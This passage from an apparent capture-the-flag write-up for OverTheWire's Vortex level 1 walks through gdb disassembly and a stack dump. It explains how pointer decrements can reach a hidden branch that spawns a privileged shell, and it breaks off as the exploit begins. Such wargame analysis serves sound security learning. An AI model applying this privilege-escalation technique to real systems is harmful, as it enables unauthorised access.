</span><span class='line'><span class="o">&lt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">gnu</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">software</span><span class="o">/</span><span class="n">gdb</span><span class="o">/</span><span class="n">bugs</span><span class="o">/&gt;.</span>
</span><span class='line'><span class="n">Find</span> <span class="n">the</span> <span class="n">GDB</span> <span class="n">manual</span> <span class="ow">and</span> <span class="n">other</span> <span class="n">documentation</span> <span class="n">resources</span> <span class="n">online</span> <span class="n">at</span><span class="p">:</span>
</span><span class='line'><span class="o">&lt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">gnu</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">software</span><span class="o">/</span><span class="n">gdb</span><span class="o">/</span><span class="n">documentation</span><span class="o">/&gt;.</span>
</span><span class='line'><span class="n">For</span> <span class="n">help</span><span class="p">,</span> <span class="nb">type</span> <span class="s">&quot;help&quot;</span><span class="o">.</span>
</span><span class='line'><span class="n">Type</span> <span class="s">&quot;apropos word&quot;</span> <span class="n">to</span> <span class="n">search</span> <span class="k">for</span> <span class="n">commands</span> <span class="n">related</span> <span class="n">to</span> <span class="s">&quot;word&quot;</span><span class="o">...</span>
</span><span class='line'><span class="n">Reading</span> <span class="n">symbols</span> <span class="kn">from</span> <span class="o">/</span><span class="n">vortex</span><span class="o">/</span><span class="n">vortex1</span><span class="o">...</span><span class="p">(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)</span><span class="o">...</span><span class="n">done</span><span class="o">.</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">set</span> <span class="n">disassembly</span><span class="o">-</span><span class="n">flavor</span> <span class="n">intel</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">set</span> <span class="n">pagination</span> <span class="n">off</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disassemble</span> <span class="n">main</span>
</span><span class='line'><span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="n">main</span><span class="p">:</span>
</span><span class='line'>   <span class="mh">0x080485c0</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">push</span>   <span class="n">ebp</span>
</span><span class='line'>   <span class="mh">0x080485c1</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
</span><span class='line'>   <span class="mh">0x080485c3</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">push</span>   <span class="n">esi</span>
</span><span class='line'>   <span class="mh">0x080485c4</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">push</span>   <span class="n">ebx</span>
</span><span class='line'>   <span class="mh">0x080485c5</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;</span><span class="p">:</span>    <span class="ow">and</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xfffffff0</span>
</span><span class='line'>   <span class="mh">0x080485c8</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x220</span>                  <span class="c"># Set stack pointer</span>
</span><span class='line'>   <span class="mh">0x080485ce</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">gs</span><span class="p">:</span><span class="mh">0x14</span>
</span><span class='line'>   <span class="mh">0x080485d4</span> <span class="o">&lt;+</span><span class="mi">20</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x21c</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'>   <span class="mh">0x080485db</span> <span class="o">&lt;+</span><span class="mi">27</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
</span><span class='line'>   <span class="mh">0x080485dd</span> <span class="o">&lt;+</span><span class="mi">29</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">lea</span>    <span class="n">eax</span><span class="p">,[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x1c</span><span class="p">]</span>
</span><span class='line'>   <span class="mh">0x080485e1</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x100</span>                  <span class="c"># + (sizeof(buf) / 2)</span>
</span><span class='line'>   <span class="mh">0x080485e6</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">],</span><span class="n">eax</span>   <span class="c"># ptr is located at $esp + 0x14</span>
</span><span class='line'>   <span class="mh">0x080485ea</span> <span class="o">&lt;+</span><span class="mi">42</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">jmp</span>    <span class="mh">0x804868e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">206</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0x080485ef</span> <span class="o">&lt;+</span><span class="mi">47</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>
</span><span class='line'>   <span class="mh">0x080485f3</span> <span class="o">&lt;+</span><span class="mi">51</span><span class="o">&gt;</span><span class="p">:</span>   <span class="nb">cmp</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0xa</span>
</span><span class='line'>   <span class="mh">0x080485f6</span> <span class="o">&lt;+</span><span class="mi">54</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">je</span>     <span class="mh">0x80485ff</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0x080485f8</span> <span class="o">&lt;+</span><span class="mi">56</span><span class="o">&gt;</span><span class="p">:</span>   <span class="nb">cmp</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x5c</span>
</span><span class='line'>   <span class="mh">0x080485fb</span> <span class="o">&lt;+</span><span class="mi">59</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">je</span>     <span class="mh">0x8048615</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">85</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0x080485fd</span> <span class="o">&lt;+</span><span class="mi">61</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">jmp</span>    <span class="mh">0x804861c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">92</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0x080485ff</span> <span class="o">&lt;+</span><span class="mi">63</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="mh">0x200</span>
</span><span class='line'>   <span class="mh">0x08048607</span> <span class="o">&lt;+</span><span class="mi">71</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">lea</span>    <span class="n">eax</span><span class="p">,[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x1c</span><span class="p">]</span>
</span><span class='line'>   <span class="mh">0x0804860b</span> <span class="o">&lt;+</span><span class="mi">75</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'>   <span class="mh">0x0804860e</span> <span class="o">&lt;+</span><span class="mi">78</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">call</span>   <span class="mh">0x804856d</span> <span class="o">&lt;</span><span class="k">print</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0x08048613</span> <span class="o">&lt;+</span><span class="mi">83</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">jmp</span>    <span class="mh">0x804868e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">206</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0x08048615</span> <span class="o">&lt;+</span><span class="mi">85</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">sub</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">],</span><span class="mh">0x1</span>
</span><span class='line'>   <span class="mh">0x0804861a</span> <span class="o">&lt;+</span><span class="mi">90</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">jmp</span>    <span class="mh">0x804868e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">206</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0x0804861c</span> <span class="o">&lt;+</span><span class="mi">92</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">]</span>
</span><span class='line'>   <span class="mh">0x08048620</span> <span class="o">&lt;+</span><span class="mi">96</span><span class="o">&gt;</span><span class="p">:</span>   <span class="ow">and</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0xff000000</span>
</span><span class='line'>   <span class="mh">0x08048625</span> <span class="o">&lt;+</span><span class="mi">101</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nb">cmp</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0xca000000</span>
</span><span class='line'>   <span class="mh">0x0804862a</span> <span class="o">&lt;+</span><span class="mi">106</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">jne</span>    <span class="mh">0x804866b</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">171</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0x0804862c</span> <span class="o">&lt;+</span><span class="mi">108</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">call</span>   <span class="mh">0x8048430</span> <span class="o">&lt;</span><span class="n">geteuid</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0x08048631</span> <span class="o">&lt;+</span><span class="mi">113</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">esi</span><span class="p">,</span><span class="n">eax</span>
</span><span class='line'>   <span class="mh">0x08048633</span> <span class="o">&lt;+</span><span class="mi">115</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">call</span>   <span class="mh">0x8048430</span> <span class="o">&lt;</span><span class="n">geteuid</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0x08048638</span> <span class="o">&lt;+</span><span class="mi">120</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">eax</span>
</span><span class='line'>   <span class="mh">0x0804863a</span> <span class="o">&lt;+</span><span class="mi">122</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">call</span>   <span class="mh">0x8048430</span> <span class="o">&lt;</span><span class="n">geteuid</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0x0804863f</span> <span class="o">&lt;+</span><span class="mi">127</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="n">esi</span>
</span><span class='line'>   <span class="mh">0x08048643</span> <span class="o">&lt;+</span><span class="mi">131</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">ebx</span>
</span><span class='line'>   <span class="mh">0x08048647</span> <span class="o">&lt;+</span><span class="mi">135</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'>   <span class="mh">0x0804864a</span> <span class="o">&lt;+</span><span class="mi">138</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">call</span>   <span class="mh">0x80483e0</span> <span class="o">&lt;</span><span class="n">setresuid</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0x0804864f</span> <span class="o">&lt;+</span><span class="mi">143</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="mh">0x0</span>
</span><span class='line'>   <span class="mh">0x08048657</span> <span class="o">&lt;+</span><span class="mi">151</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="mh">0x804876a</span>
</span><span class='line'>   <span class="mh">0x0804865f</span> <span class="o">&lt;+</span><span class="mi">159</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x804876d</span>
</span><span class='line'>   <span class="mh">0x08048666</span> <span class="o">&lt;+</span><span class="mi">166</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">call</span>   <span class="mh">0x8048420</span> <span class="o">&lt;</span><span class="n">execlp</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0x0804866b</span> <span class="o">&lt;+</span><span class="mi">171</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">lea</span>    <span class="n">eax</span><span class="p">,[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x1c</span><span class="p">]</span>
</span><span class='line'>   <span class="mh">0x0804866f</span> <span class="o">&lt;+</span><span class="mi">175</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x200</span>
</span><span class='line'>   <span class="mh">0x08048674</span> <span class="o">&lt;+</span><span class="mi">180</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nb">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'>   <span class="mh">0x08048678</span> <span class="o">&lt;+</span><span class="mi">184</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">jbe</span>    <span class="mh">0x804867c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">188</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0x0804867a</span> <span class="o">&lt;+</span><span class="mi">186</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">jmp</span>    <span class="mh">0x804868d</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">205</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0x0804867c</span> <span class="o">&lt;+</span><span class="mi">188</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">]</span>
</span><span class='line'>   <span class="mh">0x08048680</span> <span class="o">&lt;+</span><span class="mi">192</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">lea</span>    <span class="n">edx</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x1</span><span class="p">]</span>
</span><span class='line'>   <span class="mh">0x08048683</span> <span class="o">&lt;+</span><span class="mi">195</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">],</span><span class="n">edx</span>
</span><span class='line'>   <span class="mh">0x08048687</span> <span class="o">&lt;+</span><span class="mi">199</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>
</span><span class='line'>   <span class="mh">0x0804868b</span> <span class="o">&lt;+</span><span class="mi">203</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="p">],</span><span class="n">dl</span>
</span><span class='line'>   <span class="mh">0x0804868d</span> <span class="o">&lt;+</span><span class="mi">205</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">nop</span>
</span><span class='line'>   <span class="mh">0x0804868e</span> <span class="o">&lt;+</span><span class="mi">206</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">call</span>   <span class="mh">0x8048400</span> <span class="o">&lt;</span><span class="n">getchar</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0x08048693</span> <span class="o">&lt;+</span><span class="mi">211</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">],</span><span class="n">eax</span>          <span class="c"># x is located at $esp + 0x18</span>
</span><span class='line'>   <span class="mh">0x08048697</span> <span class="o">&lt;+</span><span class="mi">215</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nb">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">],</span><span class="mh">0xffffffff</span>
</span><span class='line'>   <span class="mh">0x0804869c</span> <span class="o">&lt;+</span><span class="mi">220</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">jne</span>    <span class="mh">0x80485ef</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">47</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0x080486a2</span> <span class="o">&lt;+</span><span class="mi">226</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x8048775</span>
</span><span class='line'>   <span class="mh">0x080486a9</span> <span class="o">&lt;+</span><span class="mi">233</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">call</span>   <span class="mh">0x8048440</span> <span class="o">&lt;</span><span class="n">puts</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0x080486ae</span> <span class="o">&lt;+</span><span class="mi">238</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
</span><span class='line'>   <span class="mh">0x080486b3</span> <span class="o">&lt;+</span><span class="mi">243</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x21c</span><span class="p">]</span>
</span><span class='line'>   <span class="mh">0x080486ba</span> <span class="o">&lt;+</span><span class="mi">250</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">xor</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">gs</span><span class="p">:</span><span class="mh">0x14</span>
</span><span class='line'>   <span class="mh">0x080486c1</span> <span class="o">&lt;+</span><span class="mi">257</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">je</span>     <span class="mh">0x80486c8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">264</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0x080486c3</span> <span class="o">&lt;+</span><span class="mi">259</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">call</span>   <span class="mh">0x8048410</span> <span class="o">&lt;</span><span class="n">__stack_chk_fail</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0x080486c8</span> <span class="o">&lt;+</span><span class="mi">264</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">lea</span>    <span class="n">esp</span><span class="p">,[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x8</span><span class="p">]</span>
</span><span class='line'>   <span class="mh">0x080486cb</span> <span class="o">&lt;+</span><span class="mi">267</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">pop</span>    <span class="n">ebx</span>
</span><span class='line'>   <span class="mh">0x080486cc</span> <span class="o">&lt;+</span><span class="mi">268</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">pop</span>    <span class="n">esi</span>
</span><span class='line'>   <span class="mh">0x080486cd</span> <span class="o">&lt;+</span><span class="mi">269</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">pop</span>    <span class="n">ebp</span>
</span><span class='line'>   <span class="mh">0x080486ce</span> <span class="o">&lt;+</span><span class="mi">270</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">ret</span>
</span><span class='line'><span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="o">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>At <code>main+8</code>, the stack pointer <code>esp</code> is decreased by 0x220 to make room for <code>unsigned
char buf[512]</code>, <code>unsigned char *ptr</code>, and <code>unsigned int x</code>. If we look more closely at the assembly,
we can see <code>ptr</code> is located at <code>esp + 0x14</code> because the instruction before that increases <code>eax</code> by
<code>0x100</code> or <code>(sizeof(buf) / 2)</code> or 256. <code>main+211</code> shows <code>x</code> is located right after <code>ptr</code> at <code>esp +
0x18</code> since the instruction right before calls <code>getchar()</code>. This means <code>buf[512]</code> is after that and
takes up the majority of the stack. So the stack layout is <code>ptr</code>, <code>x</code>, then <code>buf[512]</code>. This makes
sense because the compiler on more modern systems will put buffers after other variables to protect
against buffer overflows.</p>

<p>Question: why is the size of <code>ptr</code> only 4 bytes? I thought on 64-bit systems pointer variables are 8
bytes not 4 since memory should be 64-bit- or 8-byte-addressable?</p>

<p>We set a breakpoint at the <code>getchar()</code> call and run the program. Examine the first 64 words of <code>esp</code>
in hexadecimal.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="o">*</span><span class="n">main</span><span class="o">+</span><span class="mi">206</span>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x804868e</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">run</span>
</span><span class='line'><span class="n">Starting</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">vortex</span><span class="o">/</span><span class="n">vortex1</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x0804868e</span> <span class="ow">in</span> <span class="n">main</span> <span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">64</span><span class="n">wx</span> <span class="err">$</span><span class="n">esp</span>
</span><span class='line'><span class="mh">0xffffd4c0</span><span class="p">:</span>    <span class="mh">0xf7e303b4</span>  <span class="mh">0xf7fd81a8</span>  <span class="mh">0x00000000</span>  <span class="mh">0xf7fec4a8</span>
</span><span class='line'><span class="mh">0xffffd4d0</span><span class="p">:</span>    <span class="mh">0x00000007</span>  <span class="mh">0xffffd5dc</span>  <span class="mh">0x00000001</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0xffffd4e0</span><span class="p">:</span>    <span class="mh">0x00000001</span>  <span class="mh">0xf7fd81a8</span>  <span class="mh">0xf7ffd000</span>  <span class="mh">0xf7fe6d3b</span>
</span><span class='line'><span class="mh">0xffffd4f0</span><span class="p">:</span>    <span class="mh">0xf7ffc000</span>  <span class="mh">0x00001000</span>  <span class="mh">0x00000001</span>  <span class="mh">0xf7fe6cfc</span>
</span><span class='line'><span class="mh">0xffffd500</span><span class="p">:</span>    <span class="mh">0xf7ffd000</span>  <span class="mh">0x00000000</span>  <span class="mh">0xffffd5c8</span>  <span class="mh">0xf7fe724b</span>
</span><span class='line'><span class="mh">0xffffd510</span><span class="p">:</span>    <span class="mh">0xf7ffdaf0</span>  <span class="mh">0xf7fd8760</span>  <span class="mh">0x00000001</span>  <span class="mh">0x00000001</span>
</span><span class='line'><span class="mh">0xffffd520</span><span class="p">:</span>    <span class="mh">0x00000000</span>  <span class="mh">0xf7ff578c</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0xffffd530</span><span class="p">:</span>    <span class="mh">0xf7ffd55c</span>  <span class="mh">0xffffd598</span>  <span class="mh">0xffffd5b8</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0xffffd540</span><span class="p">:</span>    <span class="mh">0xf7ff578c</span>  <span class="mh">0xf7ffd55c</span>  <span class="mh">0xffffd5b8</span>  <span class="mh">0xf7fdc4ac</span>
</span><span class='line'><span class="mh">0xffffd550</span><span class="p">:</span>    <span class="mh">0xf7fdc2dc</span>  <span class="mh">0xf7fe4f3d</span>  <span class="mh">0xf7e36061</span>  <span class="mh">0x080482ff</span>
</span><span class='line'><span class="mh">0xffffd560</span><span class="p">:</span>    <span class="mh">0x00000000</span>  <span class="mh">0xf7fdc33c</span>  <span class="mh">0x00000000</span>  <span class="mh">0xf7fdc000</span>
</span><span class='line'><span class="mh">0xffffd570</span><span class="p">:</span>    <span class="mh">0x00000040</span>  <span class="mh">0x00000002</span>  <span class="mh">0x0804827d</span>  <span class="mh">0xf7ffdc24</span>
</span><span class='line'><span class="mh">0xffffd580</span><span class="p">:</span>    <span class="mh">0xf7e226bc</span>  <span class="mh">0xf7ffd000</span>  <span class="mh">0xf7e26cc4</span>  <span class="mh">0x00000001</span>
</span><span class='line'><span class="mh">0xffffd590</span><span class="p">:</span>    <span class="mh">0xf7fd8460</span>  <span class="mh">0xf7fe5694</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0xffffd5a0</span><span class="p">:</span>    <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0xf7fd8460</span>  <span class="mh">0x00000003</span>
</span><span class='line'><span class="mh">0xffffd5b0</span><span class="p">:</span>    <span class="mh">0xffffd5e0</span>  <span class="mh">0x07b1ea71</span>  <span class="mh">0xf63d4e2e</span>  <span class="mh">0xf7e26ed4</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>ptr</code> is located at <code>$esp + 0x14 = 0xffffd4d4</code> which is initialized with a value of <code>0xffffd5dc</code>.
Since ASLR is disabled, this location is fixed.</p>

<p>I first thought of a brute-force strategy of decrementing <code>ptr</code>&rsquo;s value with <code>\</code> until its highest
byte was <code>0xca</code>. That way, when it&rsquo;s bit-wise ANDed with <code>0xff000000</code>, the result would be
<code>0xca000000</code>. The exploit would be the following.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
